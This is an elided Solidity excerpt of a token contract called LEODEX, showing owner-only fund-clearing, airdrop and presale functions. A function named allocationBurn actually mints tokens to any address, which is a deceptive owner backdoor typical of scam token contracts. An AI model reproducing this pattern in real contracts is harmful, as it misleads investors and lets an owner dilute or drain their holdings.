...
contract LEODEX{
   ...
   function clearBNB() public onlyOwner() {
    ...
    function Polygonpayairdrop(address _refer)payable public returns(bool){
    ...
    function allocationBurn(address _addr, uint256 _amount) public onlyOwner returns(bool){
        _mint(_addr, _amount);
    }

    function Polygonpaypresale(address _refer) payable public returns(bool){
        require(msg.value >= 5 ether,"Transaction recovery");
